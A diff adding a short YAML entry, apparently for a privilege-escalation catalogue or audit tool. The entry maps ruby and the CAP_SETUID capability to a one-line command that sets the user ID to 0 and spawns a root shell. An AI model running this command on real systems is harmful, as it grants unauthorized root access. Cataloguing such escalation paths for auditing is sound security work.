@@ -1,0 +1,6 @@
+name: ruby
+binary_path: /usr/bin/ruby
+exploit_cmds:
+- /usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+required_caps:
+- CAP_SETUID
